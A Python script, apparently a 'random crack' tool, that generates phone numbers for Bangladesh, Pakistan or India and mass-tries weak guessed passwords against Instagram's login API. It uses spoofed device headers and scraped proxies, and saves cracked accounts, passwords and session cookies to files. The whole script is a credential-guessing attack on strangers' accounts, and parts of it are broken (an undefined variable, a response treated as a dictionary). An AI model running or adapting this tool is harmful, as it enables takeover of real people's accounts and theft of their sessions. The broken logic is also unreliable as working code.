import requests
import os,time,random,string,re,sys,requests,json,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
gtxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
try:os.system("pkg install espeak")
except:pass
os.system("git pull")
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:pass
proxsi=open('socksku.txt','r').read().splitlines()
####$#######
B = '\x1b[1;90m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
H = '\x1b[1;93m'
BL = '\x1b[1;94m'
BG = '\x1b[1;95m'
S = '\x1b[1;96m'
W = '\x1b[1;97m'
EX = '\x1b[0m'
E = '\33[m'
#########
ugen=[]
ugtn=[]
ugxn=[] 
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
###########--[ RANDOM]--#############
#######$$
dt="•"
#########
id
ok=[]
cp=[]
twf=[]
lop=0
xode=[]
plist=[]
cpx=[]
cokix=[]
apkx=[]
paswtrh = []
rcd=[]
rcdx=[]
version="1.07"
def line():
	print(40*"=")
############------[ RANDOM SYS ]------#########
BDX=f"{W}BD SIM CODE : {G}017 015 018 019 013 016{E}{W}"
INDX=f"{W}IND SIM CODE : {G}9670 9725 8948 8795 6383{E}{W}"
PAKX=f"{W}PAK SIM CODE : {G}0306 0315 0335 0345 0318{E}{W}"
LIMITX=f"EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}"
############------[ A SYS ]------#########
CPG=f"[{G}+{W}] Do you went show cp account (y/n)"
CKIG=f"[{G}+{W}] Do you went show cookie (y/n)"
chc=f'{W}[{G}+{E}] Choice : {G}'
flp=f"{W}[{G}•{W}] PUT FILE PATH\033[1;37m : {G}"
chcps=f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'
mxxt=f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]'
nflp=f"[{R}!{W}] FILE LOCATION NOT FOUND "
############------[ LOGO ]------#########
os.system('espeak -a 300 "well,come , "')
def logo():
	os.system('clear');print(f"""

\033[1;97m  .M" "bgd  .M" "bgd `7MM" "Yp, 
  ,MI    "Y ,MI    "Y   MM    Yb 
  `MMb.     `MMb.       MM    dP 
    `YMMNq.   `YMMNq.   MM" "bg. 
  .     `MM .     `MM   MM    `Y 
  Mb     dM Mb     dM   MM    ,9 
  P"Ybmmd"  P"Ybmmd"  .JMMmmmd9.    {G}INSTA AC8 CLON3
-----------------------------------------
 FACEBOOK  :     \033[1;97mShivaa Lodiwal 
 WHATAPP   :     \033[1;97m+918000032877
 FEATURE   :     \033[1;97mOLD CLONE 
 VERSION   :     \033[1;97mS 0.01
-----------------------------------------
\33[38;5;208mUse flight (airplane) mode before use
\033[1;97m-----------------------------------------
""")
############------[ RANDOM NUM ]------#########
def Main():
	logo()
	print(f' {W}[{G}A{W}]{W} RANDOM CRACK [{G}BANGLADESH{W}]');print(f' {W}[{G}B{W}]{W} RANDOM CRACK [{G}PAKISTAN{W}]');print(f' {W}[{G}C{W}]{W} RANDOM CRACK [{G}INDIA{W}]')
	line()
	ghx=input(f' [{G}+{W}] Choice : {G}')
	if ghx in ["A","a","1"]:rcd.append(f'1');rmenu1()
	elif ghx in ["B","b","2"]:rcd.append(f'2');rmenu1()
	elif ghx in ["C","c","3"]:rcd.append(f'3');rmenu1()
	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);Main()
############------[RANDOM NUMBER SYSTEM]------#########
def rmenu1():
	logo()
	if "1" in rcd:print(f"{BDX}");line()
	if "2" in rcd:print(f"{PAKX}");line()
	if "3" in rcd:print(f"{INDX}");line()
	code=input(f'{chc}');print(f"{W}{40*'='}")
	print(f'{LIMITX}');line()
	limit=int(input(f'[{G}+{E}] Limit : {G}'))
	print(f"{W}{40*'='}");print(f'{CPG}');line()
	cx=input(f'[{chc}')
	if cx in ['n','N','no','NO','2']:cpx.append(f'n')
	else:cpx.append(f'y')
	print(f"{W}{40*'='}");print(f'{CKIG}');line()
	ckiv=input(f'{chc}')
	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
	else:cokix.append(f'y')
	for number in range(limit):
		if "1" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
		if "2" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
		if "3" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(6));xode.append(numberx)
	with ThreadPool(max_workers=60) as tonxoys:
		tid= str(len(xode))
		logo();print(f' [{G}•{W}] TOTAL ID :\033[1;92m '+tid);print (f' {W}[{G}•{W}] \033[1;97mSIM CODE : \033[1;92m'+code);print(f' {W}[{G}•{W}] \033[1;37mTHE PROCESS HAS BEEN STARTED');print(f' [{G}•{W}] \033[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
		for rngx in xode:
			id=code+rngx
			if "1" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[5:]]
			if "2" in rcd:psd=[id,rngx,id[5:],"khan123"]
			if "3" in rcd:psd=[id[:7],id[:9],"57273200","59039200","57575751"]
			tonxoys.submit(graphrm,id,psd,tid)
############------[RANDOM USN SYSTEM GS GOD shivaa]-------#########
lk=[]
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}SSB{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
		vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150));VAPP = random.randint(410000000,499999999);gtt=random.choice(xxxxx);gttt=random.choice(xxxxx)
		ua = f'Mozilla/5.0 (Linux; U; Android {random.randint(4,13)}; {str(gtt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+"[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{density=3.3,width=1080,height=1430};FBLC/en_GB;FBRV/859351995;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
		headers= {
		'x-ig-app-locale': 'en_US',
		'x-ig-device-locale': 'en_US',
		'x-ig-mapped-locale': 'en_US',
		'x-pigeon-session-id': 'UFS-1a2a10d9-447c-4ba7-9a4b-202c70843c39-0',
		'x-ig-bandwidth-speed-kbps': '-1.000',
		'x-ig-bandwidth-totalbytes-b': '0',
		'x-ig-bandwidth-totaltime-ms': '0',
		'x-bloks-version-id': '16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf',
		'x-ig-www-claim': '0',
		'x-bloks-prism-button-version': 'CONTROL',
		'x-bloks-prism-colors-enabled': 'false',
		'x-bloks-prism-ax-base-colors-enabled': 'false',
		'x-bloks-prism-font-enabled': 'false',
		'x-ig-attest-params': '{"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":"IqHG7jyB502oXRivWuUZh8EnTalKMCek","signed_nonce":"","key_hash":""}]}',
		'x-bloks-is-layout-rtl': 'false',
		'x-ig-device-id': 'ddf2ffc5-b663-489d-8739-6bee00feee32',
		'x-ig-family-device-id': '008f6afa-851c-4ffe-822a-9b012bbb966f',
		'x-ig-android-id': 'android-191a8f5351ff0b41',
		'x-ig-timezone-offset': '19800',
		'x-ig-nav-chain': 'com.bloks.www.caa.login.landing_screen:com.bloks.www.caa.login.landing_screen:1:button:1765282675.886::,IgCdsScreenNavigationLoggerModule:com.bloks.www.caa.login.login_homepage:2:button:1765282678.550::',
		'x-fb-connection-type': 'WIFI',
		'x-ig-connection-type': 'WIFI',
		'x-ig-capabilities': '3brTv10=',
		'x-ig-app-id': '567067343352427',
		'priority': 'u=3',
		'user-agent': 'Instagram 361.0.0.46.88 Android (28/9; 240dpi; 540x960; samsung; SM-G970N; gracelte; qcom; en_US; 674675155)',
		'accept-language': 'en-US',
		'x-mid': 'aTfy2gABAAFBNeO5dKN9xBuHtD07',
		'ig-intended-user-id': '0',
		'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'x-fb-http-engine': 'Liger',
		'x-fb-client-ip': 'True',
		'x-fb-server-cluster': 'True',
		}
		data= {
		'params': '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":1765282675}","sim_phones":[],"aymh_accounts":[{"profiles":{"id":{"is_derived":0,"credentials":[],"account_center_id":"","profile_picture_url":"","small_profile_picture_url":null,"notification_count":0,"token":"","last_access_time":0,"has_smartlock":0,"credential_type":"none","password":"","from_accurate_privacy_result":0,"dbln_validated":0,"user_id":"","name":"","nta_eligibility_reason":null,"username":"","account_source":""}},"id":""}],"network_bssid":null,"secure_family_device_id":"","has_granted_read_contacts_permissions":0,"auth_secure_device_id":"","has_whatsapp_installed":0,"password":"#PWD_INSTAGRAM:1:1765282684:ASlWBYsnENnKrsKKC90AAS8ar3ppd0PPSp9qTxL6MifTJ8bSjBZAHYhB74+0jsTrbChydraJTeP0p3UjYbsGZb9RE85VTPfuM2KRDtLWIl2cGFZBaRsa9FCBkrXszamtrdGG0pYwjN3EeQcppP8vwZx1Ve5xXtFWKEL/X4TkorXPRR4m46VyhmQ+Ku686l1kms9rx3oOVI8o8aSNACPM2s0Xljqd6RxWMIotutPy9w1MW23pghEJpfAH97aL10VLgLg0Oit5m5oiejilRg15ZDmIlL50AGmqX/A0EOuK75cCUodaV5h7DJUUs5qo8VXOd+b9klLLb3GlVvPxgxpupNMmsJf4fn2+ChmSiS4kBlzNQhzGLsEVAgQwTLDYQg5sYS2PLIXuhxHUJcB9kg==","sso_token_map_json_string":"","block_store_machine_id":"","ig_vetted_device_nonces":null,"cloud_trust_token":null,"event_flow":"login_manual","password_contains_non_ascii":"false","client_known_key_hash":"","encrypted_msisdn":"","has_granted_read_phone_permissions":0,"app_manager_id":"","should_show_nested_nta_from_aymh":0,"device_id":"android-191a8f5351ff0b41","zero_balance_state":"","login_attempt_count":1,"machine_id":"aTfy2gABAAFBNeO5dKN9xBuHtD07","flash_call_permission_status":{"READ_PHONE_STATE":"DENIED","READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"},"accounts_list":[],"family_device_id":"008f6afa-851c-4ffe-822a-9b012bbb966f","fb_ig_device_id":[],"device_emails":[],"try_num":1,"lois_settings":{"lois_token":""},"event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{},"contact_point":"3747823648723"},"server_params":{"should_trigger_override_login_2fa_action":0,"is_vanilla_password_page_empty_password":0,"is_from_logged_out":0,"should_trigger_override_login_success_action":0,"login_credential_type":"none","server_login_source":"login","waterfall_id":"9e815d03-593b-444e-943f-fc8a1e8d867c","two_step_login_type":"one_step_login","login_source":"Login","is_platform_login":0,"INTERNAL_latency_qpl_marker_id":36707139,"is_from_aymh":0,"offline_experiment_group":"caa_iteration_v3_perf_ig_4","is_from_landing_page":0,"left_nav_button_action":"BACK","password_text_input_id":"jq8c8e:64","is_from_empty_password":0,"is_from_msplit_fallback":0,"ar_event_source":"login_home_page","qe_device_id":"ddf2ffc5-b663-489d-8739-6bee00feee32","username_text_input_id":"jq8c8e:63","layered_homepage_experiment_group":null,"device_id":"android-191a8f5351ff0b41","INTERNAL_latency_qpl_instance_id":1.19291646200294E14,"reg_flow_source":"lid_landing_screen","is_caa_perf_enabled":1,"credential_type":"password","is_from_password_entry_page":0,"caller":"gslr","family_device_id":"008f6afa-851c-4ffe-822a-9b012bbb966f","is_from_assistive_id":0,"access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0}}',
		'bk_client_context': '{"bloks_version":"16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf","styles_id":"instagram"}',
		'bloks_versioning_id': '16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf',
		}
		lo= requests.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',headers=headers,data=data,)
		if 'session_key' in lo:
			cki = lo["session_cookies"]
			ck={}
			for xk in cki:ck.update({xk["name"]:xk["value"]})
			coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
			iid= re.findall('c_user=(.*);xs', coki)[0]
			print(f'\r\r{G}[SSB-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/SSB COKI-OK.txt', 'a').write(iid+'|'+psw+'|'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[SSB 2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/SSB-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
		elif 'www.facebook.com' in lo['error']['message']:
			try:
				iid = lo['error']['error_data']['uid']
			except:
				iid=id
			if iid in ok:pass
			else:
				if 'y' in cpx:
					print(f'\r\r{R}[SSB-cp] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/SSB-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
#-৳-৳-৳-৳



